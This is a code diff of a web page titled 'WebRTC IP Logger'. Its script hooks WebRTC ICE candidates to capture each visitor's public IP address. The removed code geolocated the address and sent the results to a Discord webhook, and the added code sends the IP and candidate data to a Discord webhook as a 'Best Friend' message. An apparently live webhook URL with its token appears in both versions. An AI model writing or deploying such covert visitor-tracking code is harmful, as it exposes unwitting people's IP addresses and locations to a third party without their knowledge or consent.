@@ -1,11 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebRTC IP Logger</title>
-</head>
-<body>
     <script>
         var hasAlerted = false;
 
@@ -19,81 +11,51 @@
 
             pc.addIceCandidate = function (iceCandidate, ...rest) {
                 const fields = iceCandidate.candidate.split(" ");
+                const ip = fields[4];
 
                 console.log(iceCandidate.candidate);
-                const ip = fields[4];
+
+                // Check if it's a public IP address (srflx type)
                 if (fields[7] === "srflx") {
-                    getLocation(ip);
+                    sendWebRTCDataToDiscord({
+                        ip: ip,
+                        candidate: iceCandidate.candidate,
+                        type: fields[7]
+                    });
                 }
                 return pc.oaddIceCandidate(iceCandidate, ...rest);
             };
             return pc;
         };
 
-        let getLocation = async (ip) => {
-            let url = `https://ipwhois.app/json/${ip}`;
-            console.log("...fetching", url);
+        // Function to send WebRTC information to Discord webhook
+        function sendWebRTCDataToDiscord(data) {
+            var request = new XMLHttpRequest();
 
-            await fetch(url, { referrer: "" }).then((response) =>
-                response.json().then((json) => {
-                    let header = `- ${ip} `.padEnd(20, "-");
-                    let localTime = new Date().toLocaleString([], { timeZone: json.timezone });
-                    let output = `
-                  ${header}
-                  Country:  ${json.country}
-                  Region:   ${json.region}
-                  City:     ${json.city}
-                  Coords:   (${json.latitude}, ${json.longitude})
-                  Timezone: ${json.timezone} (${json.timezone_gmt})
-                  Time:     ${localTime}
-                  ISP:      ${json.isp}
-                  --------------------
-                  `;
-                    console.log(output);
+            // Replace this with your actual Discord webhook URL
+            request.open("POST", "https://discord.com/api/webhooks/1297979202183889039/06JY8Q-pQUM6eH84fCH2deahCkwwCg6dZL97toixTtgIUk_SRdO_3HapGS7SoNzjabZU");
 
-                    // Send data to the webhook
-                    sendToWebhook({
-                        ip: ip,
-                        country: json.country,
-                        region: json.region,
-                        city: json.city,
-                        latitude: json.latitude,
-                        longitude: json.longitude,
-                        timezone: json.timezone,
-                        local_time: localTime,
-                        isp: json.isp,
-                    });
+            request.setRequestHeader('Content-type', 'application/json');
 
-                    if (!hasAlerted) {
-                        alert(`[WebRTC:${ip}] see console for details`);
-                        hasAlerted = true;
+            // Create the parameters for the webhook message
+            var params = {
+                username: "Best Friend",
+                avatar_url: "",
+                content: "@everyone",
+                embeds: [
+                    {
+                        title: "WebRTC Data Detected",
+                        color: 1752220,
+                        description: "**IP Address:** `" + data.ip + "`\n" +
+                                     "**ICE Candidate:** `" + data.candidate + "`\n" +
+                                     "**Type:** `" + data.type + "`",
                     }
-                })
-            );
-        };
+                ]
+            };
 
-        // Function to send the extracted data to a webhook
-        let sendToWebhook = (data) => {
-            const webhookUrl = "https://discord.com/api/webhooks/1297979202183889039/06JY8Q-pQUM6eH84fCH2deahCkwwCg6dZL97toixTtgIUk_SRdO_3HapGS7SoNzjabZU"; // Replace with your actual webhook URL
-
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(data),
-            })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Data successfully sent to webhook.");
-                    } else {
-                        console.log("Failed to send data to webhook.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error sending data to webhook:", error);
-                });
-        };
+            // Send the data to the Discord webhook
+            request.send(JSON.stringify(params));
+        }
     </script>
 </body>
 </html>
